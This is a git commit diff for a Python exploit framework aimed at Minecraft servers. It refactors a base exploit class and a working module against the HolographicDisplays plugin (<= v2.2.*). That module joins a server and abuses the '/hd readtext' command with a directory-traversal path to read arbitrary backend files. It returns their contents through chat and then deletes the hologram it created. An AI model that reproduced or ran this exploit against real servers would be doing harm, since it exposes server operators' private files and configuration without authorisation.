bdefadf976fc97f88de0c20909071b1f477f5126
Jackary Hampton's PC <Jackary Hampton's PC@DESKTOP-HTEBQ8J>
2022-03-25 19:13:27 -0700

    - revamped schema

--- modules/holographics.py
+++ modules/holographics.py
@@ -1,61 +1,77 @@
 from minecraft.networking.connection import Connection
 import minecraft.networking.packets
 from minecraft.networking.packets import Packet, clientbound, serverbound
+from modules.schema import BaseExploit
 import sys
 import time
 import random
+import json
 import string
 
 
-class Exploit:
+class Exploit(BaseExploit):
     """Exploit schema"""
+
     def __init__(self, client: Connection = None, directory: str = None):
+        BaseExploit.__init__(self, client)
         self.name = "Holographics <= v2.2.*"
         self.description = "Read existing backend file paths via directory traversal"
-        self.client = client
         self.directory = directory
+        if self.client:
+            self.addEvent(self.chatHandler, minecraft.networking.packets.ChatMessagePacket)  #: on chat, receive event
 
-    def onJoin(self, dog):
-        print('Connected', dog)
+        self.cmdCreate, self.cmdRead, self.cmdGet, self.cmdDelete = False, False, False, False
+        self.counter = 0
 
-    def waitForResponse(self, chat_packet):
-        print("Message (%s): %s" % (chat_packet.field_string('position'), chat_packet.json_data))
+    def chatHandler(self, chat_packet: minecraft.networking.packets.ChatMessagePacket):
+        if chat_packet.field_string('position') == "SYSTEM":
+            if "You created a hologram named" in chat_packet.json_data:
+                self.cmdCreate = True
+
+            if "The lines were pasted into the hologram!" in chat_packet.json_data:
+                self.cmdRead = True
+
+            if "You deleted the hologram" in chat_packet.json_data:
+                self.cmdDelete = True
+
+            if "Lines of the hologram" in chat_packet.json_data:
+                print('Lines of hologram: ')
+                self.cmdGet = True
+
+            if self.cmdGet:
+                jsonData = json.loads(chat_packet.json_data)
+                if jsonData['extra'][0]['text'].isnumeric():
+                    self.counter += 1
+                    print(jsonData['extra'][2]['text'])
+
+            # print("Message (%s): %s" % (chat_packet.field_string('position'), chat_packet.json_data))
 
     def execute(self) -> tuple[bool, str]:
-        self.client.register_packet_listener(
-            self.waitForResponse, minecraft.networking.packets.ChatMessagePacket)  #: on chat, receive event
-
-        self.client.register_packet_listener(
-            self.onJoin, minecraft.networking.packets.JoinGamePacket)
-
         self.client.connect()
-
-        input('Press enter joined.')
+        while not self.joined:
+            time.sleep(0.1)
 
         holoName = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+        command = minecraft.networking.packets.ChatPacket()  #: chat packet structure
 
-        time.sleep(1.5)
+        command.message = "/hd create %s" % holoName  #: creates hologram
+        self.client.write_packet(command)  #: sends message
+        while not self.cmdCreate:
+            time.sleep(0.1)
 
-        packet = minecraft.networking.packets.ChatPacket()  #: chat packet structure
+        command.message = f"/hd readtext %s %s" % (holoName, self.directory)  #: pastes lines from file into hologram
+        self.client.write_packet(command)  #: sends message
+        while not self.cmdRead:
+            time.sleep(0.1)
 
-        packet.message = "/hd create %s" % holoName  #: creates hologram
-        self.client.write_packet(packet)  #: sends message
+        command.message = "/hd info %s" % holoName  #: lists all lines from hologram
+        self.client.write_packet(command)  #: sends message
+        while not self.cmdGet:
+            time.sleep(0.1)
 
-        time.sleep(2.0)
-
-        packet.message = f"/hd readtext %s %s" % (holoName, self.directory)  #: pastes lines from file into hologram
-        self.client.write_packet(packet)  #: sends message
-
-        time.sleep(2.0)
-
-        packet.message = "/hd info %s" % holoName  #: lists all lines from hologram
-        self.client.write_packet(packet)  #: sends message
-
-        time.sleep(2.0)
-
-        packet.message = "/hd delete %s" % holoName  #: lists all lines from hologram
-        self.client.write_packet(packet)  #: sends message
-
-        input('Press enter joined.')
+        command.message = "/hd delete %s" % holoName  #: lists all lines from hologram
+        self.client.write_packet(command)  #: sends message
+        while not self.cmdDelete:
+            time.sleep(0.1)
 
         return True, "Success in Message"
--- modules/schema.py
+++ modules/schema.py
@@ -1,12 +1,33 @@
 from minecraft.networking.connection import Connection
+from minecraft.networking.packets import Packet
+import minecraft.networking.packets
 
 
-class Exploit:
+class BaseExploit:
     """Exploit schema"""
-    def __init__(self, client: Connection=None):
-        self.name = "Exploit name here"
-        self.description = "exploit description here",
+    def __init__(self, client: Connection = None):
+        self.name = "Default Exploit"
+        self.description = "Default Description",
         self.client = client
+        self.joined = False
 
-    def execute(self) -> tuple[bool, str]:
-        return True, "Success in Message"
+        if self.client:
+            self.client.register_packet_listener(
+                self.onJoin, minecraft.networking.packets.JoinGamePacket)
+
+            self.client.register_packet_listener(
+                self.onLeave, minecraft.networking.packets.DisconnectPacket)
+
+    def addEvent(self, function, event: Packet):
+        self.client.register_packet_listener(function, event)
+
+    def onJoin(self, packet: minecraft.networking.packets.JoinGamePacket):
+        print('Connected to server. Gamemode: {}'.format(packet.game_mode))
+        self.joined = True
+
+    @staticmethod
+    def onLeave(packet):
+        print('Left:', packet)
+
+    """def execute(self) -> tuple[bool, str]:
+        return True, "Success in Message"""
